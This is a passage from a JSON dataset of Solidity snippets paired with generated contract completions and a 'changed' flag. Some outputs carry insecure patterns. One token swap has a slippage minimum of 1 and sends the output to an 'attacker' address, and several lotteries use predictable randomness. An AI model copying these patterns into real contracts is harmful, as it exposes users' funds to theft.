        "input": "function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n\n[...]\ndata = router.swapExactTokensForTokens(\n        tokens[1].balanceOf(account),\n        1,\n        path,\n        attacker,\n        chain.time(),\n        {\"from\": account},\n    )\n\n>>> int(web3.eth.getTransactionReceipt(data.txid)[\"logs\"][2][\"data\"], 16)\n631376138468681379\n\n>>> data.events\n{'Approval': [OrderedDict([('owner', '0x33A4622B82D4c04a53e170c638B944ce27cffce3'), ('spender', '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'), ('value', 4500000000000000000)])], 'Transfer': [OrderedDict([('from', '0x33A4622B82D4c04a53e170c638B944ce27cffce3'), ('to', '0xA68d9dd94574d286A75D39b1516b348620FfDCA0'), ('value', 500000000000000000)]), OrderedDict([('from', '0xA68d9dd94574d286A75D39b1516b348620FfDCA0'), ('to', '0x33A4622B82D4c04a53e170c638B944ce27cffce3'), ('value', 631376138468681379)])], 'Sync': [OrderedDict([('reserve0', 14368623861531318621), ('reserve1', 11844678011344678012)])], 'Swap': [OrderedDict([('sender', '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'), ('amount0In', 0), ('amount1In', 500000000000000000), ('amount0Out', 631376138468681379), ('amount1Out', 0), ('to', '0x33A4622B82D4c04a53e170c638B944ce27cffce3')])]}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n}\n\ncontract MyContract {\n    IUniswapV2Router02 public router;\n    IERC20[] public tokens;\n    address public attacker;\n\n    constructor(address _router, address[] memory _tokens, address _attacker) public {\n        router = IUniswapV2Router02(_router);\n        for(uint i = 0; i < _tokens.length; i++) {\n            tokens.push(IERC20(_tokens[i]));\n        }\n        attacker = _attacker;\n    }\n\n    function swapTokens(address account, address[] calldata path) external {\n        uint amountIn = tokens[1].balanceOf(account);\n        uint amountOutMin = 1;\n        uint deadline = block.timestamp + 15; // using 'now' for simplicity, for mainnet consider using oracle\n        router.swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            attacker,\n            deadline\n        );\n    }\n}\n\n",
        "changed": 1
    },
    "345.sol": {
        "input": "  const tx = await WBNBHERORouterContract.swapExactETHForTokens(\n            wbnbAmount,\n            minAmountToBuy,\n            [WBNB, HERO],\n            wallet.address,\n            Date.now() + 1000 * 60,\n            {from : ..... , value: ... , gasLimit: 251234}\n        ) \n    \nreceipt = await tx.wait();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IWBNBHERORouter {\n    function swapExactETHForTokens(\n        uint amountOutMin, \n        address[] calldata path, \n        address to, \n        uint deadline\n    ) external payable returns (uint[] memory amounts);\n}\n\ncontract MyContract {\n    IWBNBHERORouter public WBNBHERORouterContract;\n    address payable public wallet;\n    address public WBNB;\n    address public HERO;\n\n    constructor(address _WBNBHERORouterContract, address payable _wallet, address _WBNB, address _HERO) {\n        WBNBHERORouterContract = IWBNBHERORouter(_WBNBHERORouterContract);\n        wallet = _wallet;\n        WBNB = _WBNB;\n        HERO = _HERO;\n    }\n\n    function swapTokens(uint wbnbAmount, uint minAmountToBuy) public payable {\n        address[] memory path = new address[](2);\n        path[0] = WBNB;\n        path[1] = HERO;\n\n        WBNBHERORouterContract.swapExactETHForTokens{value: msg.value}(\n            minAmountToBuy,\n            path,\n            wallet,\n            block.timestamp + 1 minutes\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "347.sol": {
        "input": "pragma solidity ^0.8.0;\n\ninterface IERC20{\n    function balanceOf(address owner) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from,address to,uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ninterface IERC721{\n    function balanceOf(address owner) external view returns (uint256);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function safeTransferFrom(address from,address to,uint256 tokenId) external;\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n}\n\ncontract Vote  {\n    constructor (){}\n\n    uint public candidateId = 0;\n    uint public electionId= 0;\n    mapping (uint => Election) public allElections;\n    mapping(uint => Candidate) allCandidates;\n    mapping(uint => mapping(address => bool)) public voted;\n    string public tie;\n    \n\n\n    struct Election {\n        uint electionId;\n        address creator;\n        address identifier;\n        string details;\n        bool active;\n        Candidate[] candidates;\n    }\n\n    struct Candidate{\n        uint electionId;\n        uint candidateId;\n        string name;\n        uint vote;\n    }\n\n    function setUp( address _identifier, string memory _details , string[] calldata _candidate) public {  \n        electionId++;\n        Election storage election = allElections[electionId];\n        election.electionId = electionId;\n        election.creator = msg.sender;\n        election.identifier = _identifier;\n        election.details = _details;\n        election.active = true;\n\n        for(uint i = 0; i < _candidate.length; i++){\n            candidateId++;\n            Candidate memory candidate = Candidate(electionId,candidateId,_candidate[i],0);\n            allCandidates[candidateId] = candidate;\n            election.candidates.push(candidate);\n        }\n    }\n\n    function start(uint _electionId) public {\n        require(allElections[_electionId].creator == msg.sender, \"only moderator can start an election\");\n        allElections[_electionId].active = true;\n           }\n    \n    function vote(uint _candidateId,uint _electionId ) public {\n        require(voted[_electionId][msg.sender] == false, \"you have already voted\");\n        require(allElections[_electionId].active == true, \"election have not begun\");\n        address identifier = allElections[_electionId].identifier;\n        require(IERC20(identifier).balanceOf(msg.sender) > 0 || IERC721(identifier).balanceOf(msg.sender) > 0,\"only registered voters can vote\");\n\n        allCandidates[_candidateId].vote++;\n\n\n        voted[_electionId][msg.sender] = true;\n    }\n    \n    function announce(uint _electionId) public  returns (Candidate[] memory,string memory) {\n        require(allElections[_electionId].creator == msg.sender, \"only moderators can announce winner\");\n        allElections[_electionId].active = false;\n\n        Candidate[] memory contestants = new Candidate[](candidateId);\n        uint winningVoteCount = 0;\n        uint256 winnerId;\n        uint winningCandidateIndex = 0;\n        for(uint i =0; i < candidateId ; i++){\n            if(allCandidates[i + 1].electionId == _electionId){\n                if (allCandidates[i + 1].vote > winningVoteCount){\n                     winningVoteCount = allCandidates[i + 1].vote;\n                     uint currentId = allCandidates[i + 1].candidateId;\n                        winnerId= currentId;\n\n                      Candidate storage currentItem = allCandidates[currentId];\n                    contestants[winningCandidateIndex] = currentItem;\n                    winningCandidateIndex += 1;\n                        tie=\"\";\n                }else if(allCandidates[i + 1].vote == winningVoteCount){\n                    tie = \"This ended in a tie\";\n                }\n                \n            }\n        }\n       \n    return (contestants, tie);\n}\n\nfunction booth() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total );\n\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            if (allElections[i + 1].active == true) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n\nfunction myElections() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total);\n\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            if (allElections[i + 1].creator == msg.sender) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: MIT;\npragma solidity ^0.8.0;\n\ninterface IERC20{\n    function balanceOf(address owner) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from,address to,uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ninterface IERC721{\n    function balanceOf(address owner) external view returns (uint256);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function safeTransferFrom(address from,address to,uint256 tokenId) external;\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n}\n\ncontract Vote  {\n    constructor (){}\n\n    uint public candidateId = 0;\n    uint public electionId= 0;\n    mapping (uint => Election) public allElections;\n    mapping(uint => Candidate) allCandidates;\n    mapping(uint => mapping(address => bool)) public voted;\n    string public tie;\n    \n\n\n    struct Election {\n        uint electionId;\n        address creator;\n        address identifier;\n        string details;\n        bool active;\n        Candidate[] candidates;\n    }\n\n    struct Candidate{\n        uint electionId;\n        uint candidateId;\n        string name;\n        uint vote;\n    }\n\n    function setUp( address _identifier, string memory _details , string[] calldata _candidate) public {  \n        electionId++;\n        // NOTE: I retrieve an empty election struct from mapping and set for each field the values.  \n        Election storage election = allElections[electionId];\n        election.electionId = electionId;\n        election.creator = msg.sender;\n        election.identifier = _identifier;\n        election.details = _details;\n        election.active = true;\n\n        for(uint i = 0; i < _candidate.length; i++){\n            candidateId++;\n            Candidate memory candidate = Candidate(electionId,candidateId,_candidate[i],0);\n            allCandidates[candidateId] = candidate;\n            // NOTE: For insert the candidates inside the same election struct, I use election struct retrieved in line 51 and \n            //       then use 'push' method for add single candidate\n            election.candidates.push(candidate);\n        }\n    }\n\n    function start(uint _electionId) public {\n        require(allElections[_electionId].creator == msg.sender, \"only moderator can start an election\");\n        allElections[_electionId].active = true;\n           }\n    \n    function vote(uint _candidateId,uint _electionId ) public {\n        require(voted[_electionId][msg.sender] == false, \"you have already voted\");\n        require(allElections[_electionId].active == true, \"election have not begun\");\n        address identifier = allElections[_electionId].identifier;\n        require(IERC20(identifier).balanceOf(msg.sender) > 0 || IERC721(identifier).balanceOf(msg.sender) > 0,\"only registered voters can vote\");\n\n        allCandidates[_candidateId].vote++;\n\n\n        voted[_electionId][msg.sender] = true;\n    }\n    \n    function announce(uint _electionId) public  returns (Candidate[] memory,string memory) {\n        require(allElections[_electionId].creator == msg.sender, \"only moderators can announce winner\");\n        allElections[_electionId].active = false;\n\n        Candidate[] memory contestants = new Candidate[](candidateId);\n        uint winningVoteCount = 0;\n        uint256 winnerId;\n        uint winningCandidateIndex = 0;\n        for(uint i =0; i < candidateId ; i++){\n            if(allCandidates[i + 1].electionId == _electionId){\n                if (allCandidates[i + 1].vote > winningVoteCount){\n                     winningVoteCount = allCandidates[i + 1].vote;\n                     uint currentId = allCandidates[i + 1].candidateId;\n                        winnerId= currentId;\n\n                      Candidate storage currentItem = allCandidates[currentId];\n                    contestants[winningCandidateIndex] = currentItem;\n                    winningCandidateIndex += 1;\n                        tie=\"\";\n                }else if(allCandidates[i + 1].vote == winningVoteCount){\n                    tie = \"This ended in a tie\";\n                }\n                \n            }\n        }\n       \n    return (contestants, tie);\n}\n\nfunction booth() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total );\n\n        /// @notice Loop through all items ever created\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            /// @notice Get only public item\n            if (allElections[i + 1].active == true) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n\nfunction myElections() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total);\n\n        /// @notice Loop through all items ever created\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            /// @notice Get only public item\n            if (allElections[i + 1].creator == msg.sender) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n}\n\n",
        "changed": 0
    },
    "348.sol": {
        "input": "mapping (string => uint256) nameToTicketLevel;\n\npragma solidity ^0.8.8;\n\ncontract LevelUp {\n\n    struct Customers {\n        string name;\n        uint256 level;\n    }\n    mapping (address => Customers) customers;\n\n    function addCustomer(string memory _name, uint256 _ticketLevel) public {\n        customers[msg.sender] = Customers(_name, _ticketLevel);\n    }\n\n    function levelUp(string memory _name) public {\n        customers[msg.sender].level++;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract LevelUp {\n\n    struct Customer {\n        string name;\n        uint256 level;\n    }\n\n    mapping (address => Customer) public customers;\n    mapping (string => uint256) nameToTicketLevel;\n\n    function addCustomer(string memory _name, uint256 _ticketLevel) public {\n        customers[msg.sender] = Customer(_name, _ticketLevel);\n        nameToTicketLevel[_name] = _ticketLevel;\n    }\n\n    function levelUp(string memory _name) public {\n        require(customers[msg.sender].level < nameToTicketLevel[_name], \"Customer has reached maximum level\");\n        customers[msg.sender].level++;\n    }\n\n    function getCustomerLevel(string memory _name) public view returns (uint256) {\n        return customers[msg.sender].level;\n    }\n\n    function getTicketLevel(string memory _name) public view returns (uint256) {\n        return nameToTicketLevel[_name];\n    }\n}\n",
        "changed": 0
    },
    "349.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract PickWinner {\n    address payable[] players;\n    function pickWinner() public {\n        uint256 winnerIndex = 80 % players.length; \n        players[winnerIndex].transfer(address(this).balance); \n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract PickWinner {\n    address payable[] players;\n    function pickWinner() public {\n        uint256 winnerIndex = 80 % players.length; // I chose 80 as a \"random\" value\n        players[winnerIndex].transfer(address(this).balance); \n    }\n}\n\n",
        "changed": 0
    },
    "351.sol": {
        "input": "pragma solidity ^0.8.0; \n\n\ncontract Test{\n    function test() public pure returns (uint8 [1] memory,uint8 [1] memory) {\n        return ([2],[1]);\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0; \n\n\ncontract Test{\n    function test() public pure returns (uint8 [1] memory,uint8 [1] memory) {\n        return ([2],[1]);\n    }\n}\n\n",
        "changed": 0
    },
    "352.sol": {
        "input": "pragma solidity 0.8.7;\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract SafeMathTest {\n    using SafeMath for uint256;\n\n    function a(uint256 x) external pure returns (uint256 sum) {\n        sum = x.add(1);\n    }\n\n    function b(uint256 x) external pure returns (uint256 sum) {\n        sum = x + 1;\n    }\n}\n\ncontract SafeMathTest2 {\n    using SafeMath for uint256;\n\n    function b(uint256 x) external pure returns (uint256 sum) {\n        sum = x.add(1);\n    }\n\n    function a(uint256 x) external pure returns (uint256 sum) {\n        sum = x + 1;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "353.sol": {
        "input": "import \"@openzeppelin/contract/token/ERC20/ERC20.sol\";\n\ncontract exampleContract {\n    ERC20 USDTToken = ERC20(\"USDT Contract Address Here\");\n\n    USDTToken.approve(address(this), _amount);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "354.sol": {
        "input": " hardhat: {\n      allowUnlimitedContractSize: true,\n    }\n\nimport \"ContractA.sol\";\ncontract Factory {\n A public a;\n function createA() public {\n   a = new A();\n }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "355.sol": {
        "input": "    function giveResaleApproval(uint256 tokenId) public {\n        require(\n            ownerOf(tokenId) == msg.sender,\n            \"You must own this NFT in order to resell it\"\n        );\n        setApprovalForAll(contractAddress, true);\n        return;\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "356.sol": {
        "input": "ERC20Token _token = ERC20Token(address(token));\n\nERC20Token _token = new ERC20Token();\n\naddress tokenAddress = address(_token);\n\n\n",
        "output": "",
        "changed": 0
    },
    "357.sol": {
        "input": "contract DEXTransferCoinUserToUser is DEXUserCoin {\n}\n\nconstructor (DEXUserCoin _dex){\n    desxUserCoin=_dex;\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DEXUserCoin {\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {}\n}\n\ncontract DEXTransferCoinUserToUser {\n    DEXUserCoin private dexUserCoin;\n\n    constructor (DEXUserCoin _dex) public {\n        dexUserCoin = _dex;\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public returns (bool) {\n        return dexUserCoin.transferFrom(_from, _to, _amount);\n    }\n}\n\n",
        "changed": 0
    },
    "358.sol": {
        "input": "contract Cloth {\n    struct Clothes {\n        string name;\n        string color;\n    }\n\n    Clothes[5] public clothes;\n    uint counter = 0;\n\n    function addCloth(string calldata _name, string calldata _color) public {\n        require(counter < 5, \"Can't add more clothes. Limit of the array reached.\");\n        clothes[counter] = Clothes(_name,_color);\n        counter++;\n    }\n}\n\n",
        "output": "contract Cloth {\n    struct Clothes {\n        string name;\n        string color;\n    }\n\n    Clothes[5] public clothes;\n    uint counter = 0;\n\n    function addCloth(string calldata _name, string calldata _color) public {\n        require(counter < 5, \"Can't add more clothes. Limit of the array reached.\");\n        clothes[counter] = Clothes(_name,_color);\n        counter++;\n    }\n}\n",
        "changed": 0
    },
    "359.sol": {
        "input": "contract TimestampTest {\n   function getTimestampInHMS() public view returns (string memory) {\n      uint256 timestamp = block.timestamp;\n      uint256 _hours = (timestamp / 3600) % 24;\n      uint256 _minutes = (timestamp / 60) % 60;\n      uint256 _seconds = timestamp % 60;\n\n      return string(abi.encodePacked(\n         _hours < 10 ? \"0\" : \"\", toString(_hours), \":\",\n         _minutes < 10 ? \"0\" : \"\", toString(_minutes), \":\",\n         _seconds < 10 ? \"0\" : \"\", toString(_seconds)\n      ));\n   }\n\n   function toString(uint256 val) internal pure returns (string memory) {\n      if (val == 0)\n         return \"0\";\n      uint256 digits;\n      uint256 tmp = val;\n      while (tmp != 0) {\n         digits++;\n         tmp /= 10;\n      }\n      bytes memory newBuffer = new bytes(digits);\n      while (val != 0) {\n         digits -= 1;\n         newBuffer[digits] = bytes1(uint8(48 + val % 10));\n         val = val / 10;\n      }\n      return string(newBuffer);\n   }\n}\n\nconst convertPriceToUSD = (tokenPriceUSD, amount = 27554820000) => {\n    const amountBNB = amount / 10 ** 18;\n    const amountUSD = amountBNB * tokenPriceUSD;\n    return amountUSD;\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimestampTest {\n   function getTimestampInHMS() public view returns (string memory) {\n      uint256 timestamp = block.timestamp;\n      uint256 _hours = (timestamp / 3600) % 24;\n      uint256 _minutes = (timestamp / 60) % 60;\n      uint256 _seconds = timestamp % 60;\n\n      return string(abi.encodePacked(\n         _hours < 10 ? \"0\" : \"\", toString(_hours), \":\",\n         _minutes < 10 ? \"0\" : \"\", toString(_minutes), \":\",\n         _seconds < 10 ? \"0\" : \"\", toString(_seconds)\n      ));\n   }\n\n   function toString(uint256 val) internal pure returns (string memory) {\n      if (val == 0)\n         return \"0\";\n      uint256 digits;\n      uint256 tmp = val;\n      while (tmp != 0) {\n         digits++;\n         tmp /= 10;\n      }\n      bytes memory newBuffer = new bytes(digits);\n      while (val != 0) {\n         digits -= 1;\n         newBuffer[digits] = bytes1(uint8(48 + val % 10));\n         val = val / 10;\n      }\n      return string(newBuffer);\n   }\n\n   function convertPriceToUSD(uint256 tokenPriceUSD, uint256 amount) public pure returns (uint256) {\n       uint256 amountBNB = amount / 10 ** 18;\n       uint256 amountUSD = amountBNB * tokenPriceUSD;\n       return amountUSD;\n   }\n}\n\n",
        "changed": 0
    },
    "361.sol": {
        "input": "IdToAddress[Id] = address(0x123);\n\nfunction transfer(address _recipient, uint256 _id) public {\n    require(IdToAddress[_id] == msg.sender, \"You're not the current token owner\");\n    IdToAddress[_id] = _recipient;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenContract {\n    mapping(uint256 => address) public IdToAddress;\n\n    constructor() public {\n        IdToAddress[1] = address(0x123);\n    }\n\n    function transfer(address _recipient, uint256 _id) public {\n        require(IdToAddress[_id] == msg.sender, \"You're not the current token owner\");\n        IdToAddress[_id] = _recipient;\n    }\n}\n\n",
        "changed": 0
    },
    "362.sol": {
        "input": "await contract.unlock(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PasswordContract {\n    bytes32 private hashedPassword;\n    \n    constructor(string memory password) {\n        hashedPassword = keccak256(abi.encodePacked(password));\n    }\n    \n    function checkPassword(string memory password) public view returns(bool) {\n        bytes32 hashedInput = keccak256(abi.encodePacked(password));\n        return hashedInput == hashedPassword;\n    }\n}\n\n",
        "changed": 0
    },
    "363.sol": {
        "input": "constructor(address _VRFCoordinator, address _LinkToken, bytes32 _keyhash)\npublic \nVRFConsumerBase(_VRFCoordinator, _LinkToken) \nERC721(\"Snails\", \"SNAIL\") \n{\n    keyHash = _keyhash;\n    fee = 0.1 * 10**18; \n    tokenCounter = 0;\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "364.sol": {
        "input": "def compile_source_file(file_path):\n    solcx.install_solc(version='0.8.9')\n    solcx.set_solc_version('0.8.9')\n    with open(file_path, 'r') as f:\n        source = f.read()\n        print(source)\n    return solcx.compile_source(source)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    string public data;\n\n    function setData(string memory _data) public {\n        data = _data;\n    }\n\n    function getData() public view returns (string memory) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "365.sol": {
        "input": "keccak256(msg.sender)\n\nuint tmpData = uint160(keccak256(msg.sender))\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract HashGenerator {\n    // state variable to store the hashed value of the sender\n    uint public tmpData;\n\n    function generateHash() public {\n        // generate the hash of the sender's address\n        bytes32 hash = keccak256(abi.encodePacked(msg.sender));\n\n        // convert the hash to a uint\n        tmpData = uint160(hash);\n    }\n}\n\n",
        "changed": 0
    },
    "366.sol": {
        "input": "contract Category is Post {\n  function isCategoryExists(uint256 index) external view returns (bool) {\n    if (categories[index].isExist) {\n      return true;\n    }\n    return false;\n  }\n  createPost(){}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Post {\n    struct Category {\n        bool isExist;\n        string name;\n    }\n\n    mapping(uint256 => Category) public categories;\n\n    constructor() public {\n        categories[1] = Category(true, \"Category1\");\n        categories[2] = Category(true, \"Category2\");\n    }\n}\n\n",
        "changed": 0
    },
    "367.sol": {
        "input": "function validateAdditionalCalldata() pure external returns (bool, address) {\n    bytes memory additionalCalldataMemory = hex\"0000000000000000000000000000000000000000000000000000000000000001\";\n    bool decoded1 = abi.decode(additionalCalldataMemory, (bool));\n    address decoded2 = abi.decode(additionalCalldataMemory, (address));\n\n    return (decoded1, decoded2);\n}\n\npragma solidity ^0.8;\n\ncontract FooResolver {\n    function validateAdditionalCalldata() external view returns (bool, address) {\n        bytes memory additionalCalldataMemory = hex\"0000000000000000000000000000000000000000000000000000000000000002\";\n\n        bool decoded1;\n        try this.decodeToBool(additionalCalldataMemory) returns (bool decodedValue) {\n            decoded1 = decodedValue;\n        } catch {\n            decoded1 = false;\n        }\n\n        address decoded2 = abi.decode(additionalCalldataMemory, (address));\n\n        return (decoded1, decoded2);\n    }\n\n    function decodeToBool(bytes memory data) external pure returns (bool) {\n        return abi.decode(data, (bool));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FooResolver {\n    function validateAdditionalCalldata() external pure returns (bool, address) {\n        bytes memory additionalCalldataMemory = hex\"0000000000000000000000000000000000000000000000000000000000000001\";\n        bool decoded1 = abi.decode(additionalCalldataMemory, (bool));\n        address decoded2 = abi.decode(additionalCalldataMemory, (address));\n\n        return (decoded1, decoded2);\n    }\n}\n",
        "changed": 0
    },
    "368.sol": {
        "input": "address payable players[].transfer();\n\nuint index = random() % players.length;\nuint amount = address(this).balance; \npayable(players[index]).transfer(amount);\n\nuint amount = 0.01 ether;\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract LuckyDraw {\n    address payable[] public players;\n    uint public amount = 0.01 ether;\n\n    function participate() public payable {\n        require(msg.value == amount, \"Participation fee is 0.01 Ether\");\n        players.push(msg.sender);\n    }\n\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players.length)));\n    }\n\n    function draw() public {\n        uint index = random() % players.length;\n        uint prize = address(this).balance;\n        payable(players[index]).transfer(prize);\n\n        // Reset the players\n        delete players;\n    }\n\n    function getPlayers() public view returns (address payable[] memory) {\n        return players;\n    }\n}\n\n",
        "changed": 1
    },
    "369.sol": {
        "input": "contract TestCoin is ERC20, Ownable {\n    *********\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "370.sol": {
        "input": "pragma solidity >0.4.23 <0.9.0;\n\nimport { Clones } from \"@openzeppelin/contracts/proxy/Clones.sol\";\n\ncontract NebCrewFactory {\n\n    NebCrew[] public NebCrewAddresses;\n    address public implementationAddress;\n    function addNebCrew() public {\n\n        NebCrew nebCrewAddress = NewCrew(Clones.clone(implementationAddress));\n\n        nebCrewAddress.initialize(); \n\n        NebCrewAddresses.push(nebCrewAddress);\n    }\n}\n\ncontract NebCrew{\n\n    address public crew;\n\n    initialize() {\n        require(crew == address(0), \"already initialized\");\n        crew = msg.sender;\n    }\n\n    function welcomeCrew() public pure returns (string memory _greeting) {\n        return \"Welcome to the truth...\";\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "371.sol": {
        "input": "function getGreetings() public view returns (string calldata)\n\nfunction foo(string calldata inputString) public pure returns (string calldata) {\n    return inputString;\n}\n\nfunction getGreetings() public view returns (string memory) {\n    return message;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public message;\n\n    constructor(string memory initialMessage) {\n        message = initialMessage;\n    }\n\n    function getGreetings() public view returns (string memory) {\n        return message;\n    }\n\n    function foo(string calldata inputString) public pure returns (string memory) {\n        return inputString;\n    }\n\n    function setGreetings(string memory newMessage) public {\n        message = newMessage;\n    }\n}\n\n",
        "changed": 0
    },
    "372.sol": {
        "input": "var input = {\n  language: 'Solidity',\n  sources: {\n    'project:/contracts/test.sol': {\n      content: 'contract C { function f() public { } }'\n    }\n  },\n  settings: {\n    outputSelection: {\n      '*': {\n        '*': ['*']\n      }\n    }\n  }\n};\n\nvar input = {\n  language: 'Solidity',\n  sources: {\n    'contracts/test.sol': {\n      content: 'contract C { function f() public { } }'\n    }\n  },\n  settings: {\n    outputSelection: {\n      '*': {\n        '*': ['*']\n      }\n    }\n  }\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract C {\n    function f() public {\n        // insert function logic here\n    }\n}\n\n",
        "changed": 0
    },
    "373.sol": {
        "input": "mapping(address => Participant) public _participantMap;\n\nfunction participate() external payable {\n    require(msg.value == 2 ether,\"The amount must be equal to 2 Ethers\");\n    if (_participantMap[msg.sender].participantAddr == address(0)) {\n        _participantMap[msg.sender] = Participant(msg.sender, 1);\n    } else {\n        _participantMap[msg.sender].noOfLotts += 1;\n    }\n}\n\nimport { ethers } from \"hardhat\";\n\nasync function main() {\n    const [owner, userOne, userTwo] = await ethers.getSigners();\n\n    const contractAddress = process.env.LOTTERY_CONTRACT_ADDRESS;\n\n    const Lottery = await ethers.getContractFactory(\"Lottery\");\n    const contractInstance = await Lottery.attach(`${contractAddress}`);\n    await contractInstance.connect(userOne).participate({\n        value: ethers.utils.parseUnits(\"2\", \"ether\"),\n    });\n\n    const participant = await contractInstance._participantMap(`${userOne.address}`);\n    console.log(participant);\n}\n\nmain().catch((error) => {\n    console.error(error);\n    process.exitCode = 1;\n});\n\nnpx hardhat run scripts/2_participate.ts --network localhost\n[\n  '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  BigNumber { value: \"1\" },\n  participantAddr: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  noOfLotts: BigNumber { value: \"1\" }\n]\n\nnpx hardhat run scripts/2_participate.ts --network localhost\n[\n  '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  BigNumber { value: \"2\" },\n  participantAddr: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  noOfLotts: BigNumber { value: \"2\" }\n]\n\nnpx hardhat run scripts/2_participate.ts --network localhost\n[\n  '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  BigNumber { value: \"3\" },\n  participantAddr: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  noOfLotts: BigNumber { value: \"3\" }\n]\n\nCompiled 1 Solidity file successfully\n[\n  '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',\n  BigNumber { value: \"1\" },\n  participantAddr: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',\n  noOfLotts: BigNumber { value: \"1\" }\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    struct Participant {\n        address participantAddr;\n        uint noOfLotts;\n    }\n\n    mapping(address => Participant) public _participantMap;\n\n    function participate() external payable {\n        require(msg.value == 2 ether,\"The amount must be equal to 2 Ethers\");\n        \n        if (_participantMap[msg.sender].participantAddr == address(0)) {\n            _participantMap[msg.sender] = Participant(msg.sender, 1);\n        } else {\n            _participantMap[msg.sender].noOfLotts += 1;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "374.sol": {
        "input": "contract YourContract {\n    function pullTokens() external {\n        tokenContract.transferFrom(msg.sender, address(this), amount);\n    }\n}\n\n\n",
